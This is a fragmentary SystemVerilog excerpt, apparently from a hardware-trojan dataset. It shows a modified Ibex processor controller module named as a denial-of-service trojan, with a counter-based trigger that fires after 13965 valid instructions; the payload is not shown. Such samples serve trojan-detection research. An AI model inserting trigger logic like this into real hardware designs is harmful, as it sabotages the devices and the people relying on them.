...
module ibex_controller_trojan_DoS #(
  ...
  output logic                  perf_tbranch_o           // we are executing a taken branch
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13965)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13965;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (instr_valid_i) trojan_counter <= trojan_counter + 1;
